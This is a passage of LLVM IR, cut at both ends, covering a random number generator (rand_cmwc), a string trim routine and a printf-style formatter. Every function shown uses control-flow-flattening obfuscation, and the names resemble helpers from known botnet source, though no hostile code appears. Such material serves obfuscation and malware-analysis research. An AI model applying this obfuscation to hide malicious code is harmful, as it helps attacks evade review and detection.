  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -976298927, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -976298927, label %first
    i32 1442951716, label %30
    i32 904779026, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 1442951716, i32 904779026
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 904779026, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 854788990, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 854788990, label %10
    i32 1019021460, label %20
    i32 -984880218, label %23
    i32 -320861149, label %24
    i32 -3201048, label %29
    i32 -1004503284, label %38
    i32 1835438241, label %40
    i32 537939692, label %43
    i32 -159501944, label %45
    i32 -712003339, label %50
    i32 -2145664356, label %62
    i32 772669588, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1019021460, i32 -984880218
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 854788990, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -320861149, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -3201048, i32 -1004503284
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 -1004503284, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 1835438241, i32 537939692
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -320861149, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -159501944, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 -712003339, i32 772669588
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -2145664356, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -159501944, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -1201103078, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i64*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1201103078, label %12
    i32 -1628324635, label %18
    i32 105933969, label %24
    i32 -109943125, label %32
    i32 1088287156, label %33
    i32 1139118063, label %39
    i32 -1710080221, label %40
    i32 -1319270189, label %46
    i32 -1080866350, label %49
    i32 324468434, label %50
    i32 1403880682, label %56
    i32 1317240999, label %61
    i32 -59589551, label %62
    i32 1391332765, label %68
    i32 582769677, label %73
    i32 533496081, label %75
    i32 2002345606, label %84
    i32 637082183, label %87
    i32 -999021891, label %93
    i32 1574298688, label %99
    i32 126315445, label %105
    i32 -1744341606, label %110
    i32 -304831518, label %117
    i32 -1910477156, label %119
    i32 -1999681938, label %120
    i32 180662689, label %126
    i32 -1897842619, label %132
    i32 -525885646, label %139
    i32 2046580020, label %145
    i32 705173233, label %150
    i32 316927282, label %157
    i32 886069164, label %163
    i32 -430594665, label %170
    i32 -557391363, label %176
    i32 -1086962351, label %181
    i32 2145417845, label %188
    i32 -1602499579, label %194
    i32 -1464466417, label %201
    i32 394033782, label %207
    i32 -427824190, label %212
    i32 444034085, label %219
    i32 -774517424, label %225
    i32 1703863414, label %232
    i32 -2097085411, label %238
    i32 -2142588127, label %243
    i32 1336292159, label %250
    i32 -602039515, label %256
    i32 -499776367, label %262
    i32 1620199876, label %268
    i32 -1830019946, label %273
    i32 -1545964713, label %285
    i32 1814187634, label %286
    i32 1971539102, label %287
    i32 -1202204902, label %294
    i32 450106877, label %295
    i32 -1680011018, label %298
    i32 -1702020580, label %302
    i32 416327886, label %305
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1628324635, i32 -1680011018
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 105933969, i32 1814187634
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -109943125, i32 1088287156
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1680011018, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 1139118063, i32 -1710080221
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 1971539102, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -1319270189, i32 -1080866350
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1080866350, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 324468434, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 1403880682, i32 1317240999
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 324468434, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -59589551, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1391332765, i32 582769677
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 582769677, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 533496081, i32 637082183
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 2002345606, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -59589551, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -999021891, i32 180662689
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 1574298688, i32 126315445
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i64*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1744341606, i32* %switchVar
  store i64* %103, i64** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i64*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1744341606, i32* %switchVar
  store i64* %108, i64** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i64*, i64** %.reg2mem78
  %111 = load i64, i64* %.reload79, align 8
  %112 = inttoptr i64 %111 to i8*
  store i8* %112, i8** %11, align 8
  %113 = load i8**, i8*** %4, align 8
  store i8** %113, i8*** %.reg2mem11
  %114 = load i8*, i8** %11, align 8
  %115 = icmp ne i8* %114, null
  %116 = select i1 %115, i32 -304831518, i32 -1910477156
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %11, align 8
  store i32 -1999681938, i32* %switchVar
  store i8* %118, i8** %.reg2mem80
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 -1999681938, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %121 = load i32, i32* %7, align 4
  %122 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %123 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %121, i32 %122)
  %124 = load i32, i32* %9, align 4
  %125 = add nsw i32 %124, %123
  store i32 %125, i32* %9, align 4
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %5, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 100
  %131 = select i1 %130, i32 -1897842619, i32 316927282
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  store i8** %133, i8*** %.reg2mem13
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %134, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %135, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %136 = load i32, i32* %.reload21, align 8
  store i32 %136, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %137 = icmp ule i32 %.reload25, 40
  %138 = select i1 %137, i32 -525885646, i32 2046580020
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %141 = load i8*, i8** %140, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %142 = getelementptr i8, i8* %141, i32 %.reload24
  %143 = bitcast i8* %142 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %144 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %144, i32* %.reload20, align 8
  store i32 705173233, i32* %switchVar
  store i32* %143, i32** %.reg2mem82
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to i32*
  %149 = getelementptr i8, i8* %147, i32 8
  store i8* %149, i8** %146, align 8
  store i32 705173233, i32* %switchVar
  store i32* %148, i32** %.reg2mem82
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %151 = load i32, i32* %.reload83, align 4
  %152 = load i32, i32* %7, align 4
  %153 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %154 = call i32 @printi(i8** %.reload14, i32 %151, i32 10, i32 1, i32 %152, i32 %153, i32 97)
  %155 = load i32, i32* %9, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %9, align 4
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %5, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 120
  %162 = select i1 %161, i32 886069164, i32 2145417845
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8**, i8*** %4, align 8
  store i8** %164, i8*** %.reg2mem26
  %165 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %165, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %166, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %167 = load i32, i32* %.reload34, align 8
  store i32 %167, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %168 = icmp ule i32 %.reload38, 40
  %169 = select i1 %168, i32 -430594665, i32 -557391363
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %173 = getelementptr i8, i8* %172, i32 %.reload37
  %174 = bitcast i8* %173 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %175 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %175, i32* %.reload33, align 8
  store i32 -1086962351, i32* %switchVar
  store i32* %174, i32** %.reg2mem84
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to i32*
  %180 = getelementptr i8, i8* %178, i32 8
  store i8* %180, i8** %177, align 8
  store i32 -1086962351, i32* %switchVar
  store i32* %179, i32** %.reg2mem84
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %182 = load i32, i32* %.reload85, align 4
  %183 = load i32, i32* %7, align 4
  %184 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %185 = call i32 @printi(i8** %.reload27, i32 %182, i32 16, i32 0, i32 %183, i32 %184, i32 97)
  %186 = load i32, i32* %9, align 4
  %187 = add nsw i32 %186, %185
  store i32 %187, i32* %9, align 4
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8*, i8** %5, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 88
  %193 = select i1 %192, i32 -1602499579, i32 444034085
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8**, i8*** %4, align 8
  store i8** %195, i8*** %.reg2mem39
  %196 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %196, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %197, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %198 = load i32, i32* %.reload47, align 8
  store i32 %198, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %199 = icmp ule i32 %.reload51, 40
  %200 = select i1 %199, i32 -1464466417, i32 394033782
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %202 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %203 = load i8*, i8** %202, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %204 = getelementptr i8, i8* %203, i32 %.reload50
  %205 = bitcast i8* %204 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %206 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %206, i32* %.reload46, align 8
  store i32 -427824190, i32* %switchVar
  store i32* %205, i32** %.reg2mem86
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %208 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %209 = load i8*, i8** %208, align 8
  %210 = bitcast i8* %209 to i32*
  %211 = getelementptr i8, i8* %209, i32 8
  store i8* %211, i8** %208, align 8
  store i32 -427824190, i32* %switchVar
  store i32* %210, i32** %.reg2mem86
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %213 = load i32, i32* %.reload87, align 4
  %214 = load i32, i32* %7, align 4
  %215 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %216 = call i32 @printi(i8** %.reload40, i32 %213, i32 16, i32 0, i32 %214, i32 %215, i32 65)
  %217 = load i32, i32* %9, align 4
  %218 = add nsw i32 %217, %216
  store i32 %218, i32* %9, align 4
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %5, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 117
  %224 = select i1 %223, i32 -774517424, i32 1336292159
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i8**, i8*** %4, align 8
  store i8** %226, i8*** %.reg2mem52
  %227 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %227, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %228, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %229 = load i32, i32* %.reload60, align 8
  store i32 %229, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %230 = icmp ule i32 %.reload64, 40
  %231 = select i1 %230, i32 1703863414, i32 -2097085411
  store i32 %231, i32* %switchVar
  br label %loopEnd

